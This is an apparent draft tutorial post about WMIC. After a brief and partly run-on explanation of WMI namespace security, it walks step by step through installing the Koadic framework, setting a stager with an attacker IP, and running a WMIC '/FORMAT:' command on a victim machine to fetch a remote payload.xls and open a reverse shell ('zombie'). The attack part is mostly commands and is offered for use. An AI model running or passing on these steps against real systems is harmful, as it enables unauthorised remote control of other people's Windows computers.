---
title: "[03] WMIC"
date: 2026-10-26
authors:
  - Prasanna
draft: true
---

{{< meta >}}

#### What is WMIC ?
WMI is Windows Management Instrumentation is typically used for managing data in a windows operating system Its also highly efficient just like power shell since a user will be able to write scripts to automate tasks in a remote device. Due to this functionality its required to implement security features to prevent any unauthenticated services and operations.
#### Security with WMIC:
WMI security focuses on protecting access to namespace data. WMI first grants access to groups of users as specified by the _WMI Control_ and DCOM settings and then providers determine if the user should have access to namespace data. Namespace security depends on standard Windows user _security identifiers (SID)_ and the _security descriptor_ for the WMI namespace. You can set namespace security by performing the following actions WMIC is capable of invoking XLS scripts, this allows an attacker to push a malicious excel script which could provide a reverse shell.

We will use kodiac to generate malicious XLS script, lets download the framework.

##### STEP 1: open terminal a type the following command
```bash
$ git clone [https://github.com/zerosum0x0/koadic.git](https://github.com/zerosum0x0/koadic.git)

```
##### STEP 2: Move to the kodic directory & install the dependencies
```bash
$ cd koadic
$ pip3 install -r requirements.txt
```
##### STEP 3: Run kodic & Generate the XLS file
```bash
$ use stager/js/wmic
$ set SRVHOST [Attacker IP]
$ run
```
##### STEP 4: Download the payload from the victims device through WIMC command.
```bash
$ wmic os get /FORMAT:"[http://10.0.2.4:9996/payload.xls](http://10.0.2.4:9996/payload.xls)”
```
##### STEP 5: From the attackers console, you can see the infected zombie

```bash
$ zombies 0
```

![](/docs/03_techniques/assets/Pasted_image_20261122001534.png)